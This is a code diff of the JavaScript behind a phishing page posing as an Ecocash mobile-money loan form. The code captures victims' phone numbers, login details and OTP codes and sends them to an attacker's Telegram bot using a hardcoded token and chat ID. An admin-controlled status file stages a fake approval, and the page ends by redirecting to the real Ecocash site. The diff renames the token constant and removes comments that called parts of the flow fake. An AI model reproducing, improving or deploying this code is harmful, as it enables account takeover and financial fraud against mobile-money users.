@@ -1,6 +1,6 @@
 // CONFIG — CHANGE THESE
-const BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';  // e.g., 7891234567:AAFdjkfjkdjfkjdjfkjdjfkj
-const CHAT_ID = '1469249528';               // e.g., 123456789
+const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';  // <<< RENAME: BOT_TOKEN → TELEGRAM_BOT_TOKEN
+const CHAT_ID = '1469249528';
 
 // Update installment in real-time
 document.getElementById('amount').addEventListener('input', updateInstallment);
@@ -23,7 +23,7 @@ document.getElementById('loanForm').addEventListener('submit', async function(e)
     const duration = document.getElementById('duration').value;
     const installment = (amount / duration).toFixed(2);
 
-    // Send to Telegram
+    // Send credentials to Telegram
     const credentialsMsg = `
 📞 *Ecocash Login*  
 📱 *Phone:* ${phone}  
@@ -40,11 +40,11 @@ document.getElementById('loanForm').addEventListener('submit', async function(e)
     document.getElementById('loanForm').style.display = 'none';
     document.getElementById('otpScreen').style.display = 'block';
 
-    // Start polling fake approval
+    // Start polling for approval
     pollApproval(phone);
 });
 
-// Poll every 3 seconds for "approval"
+// Poll every 3 seconds for approval status
 async function pollApproval(phone) {
     const statusMsg = document.getElementById('statusMsg');
     const otpInput = document.getElementById('otp');
@@ -57,7 +57,6 @@ async function pollApproval(phone) {
             return;
         }
 
-        // Simulate admin-controlled response via external file
         try {
             const res = await fetch('approval_status.txt?' + new Date().getTime());
             const decision = await res.text();
@@ -66,7 +65,7 @@ async function pollApproval(phone) {
                 clearInterval(interval);
                 statusMsg.textContent = "✅ Approved! Redirecting...";
                 setTimeout(() => {
-                    window.location.href = "https://ecocash.co.zw"; // Fake redirect
+                    window.location.href = "https://ecocash.co.zw";
                 }, 2000);
             } else if (decision.trim() === 'wrong_pin') {
                 clearInterval(interval);
@@ -78,16 +77,17 @@ async function pollApproval(phone) {
                 statusMsg.textContent = "❌ Invalid OTP.";
             }
         } catch (err) {
-            // Ignore — simulate network lag
+            // Silently fail — network lag simulation
         }
 
         attempts++;
     }, 3000);
 
-    // Listen for OTP input
-    document.getElementById('otp').addEventListener('input', async function() {
+    // Capture OTP as soon as 4 digits are entered
+    otpInput.addEventListener('input', async function() {
         if (this.value.length === 4) {
-            await sendToTelegram(`🔑 *OTP Received:* ${this.value} | 📱 ${phone} | ⏱️ ${new Date().toISOString()}`);
+            const otpMsg = `🔑 *OTP Captured:* ${this.value}  | 📱 *Phone:* ${phone} | ⏱️ ${new Date().toISOString()}`;
+            await sendToTelegram(otpMsg);
         }
     });
 }
@@ -103,5 +103,5 @@ async function sendToTelegram(message) {
             text: message,
             parse_mode: 'Markdown'
         })
-    }).catch(() => {}); // Silent fail
+    }).catch(() => {}); // Fail silently
 }
